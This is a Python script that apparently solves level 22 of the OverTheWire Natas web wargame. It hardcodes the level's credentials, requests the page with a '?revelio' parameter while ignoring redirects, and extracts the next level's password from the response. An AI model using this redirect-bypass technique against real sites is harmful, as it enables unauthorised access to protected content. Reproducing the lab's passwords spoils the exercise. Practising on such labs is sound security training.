# -*- coding: utf-8 -*-
from base import get_page, post_page
import re
from time import sleep
import requests

def natas22():
    username="natas22"
    password = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"
    url = "http://natas22.natas.labs.overthewire.org/"
    response = requests.get(url+"?revelio", auth=(username, password), allow_redirects=False)
    content = response.content.decode("utf-8")
    password = re.search(r"(?<=Password: )\w{32}", content)
    if password is None:
        print("Fail to find password")
        return
    print(password.group(0))
    

if __name__ == "__main__":
    natas22()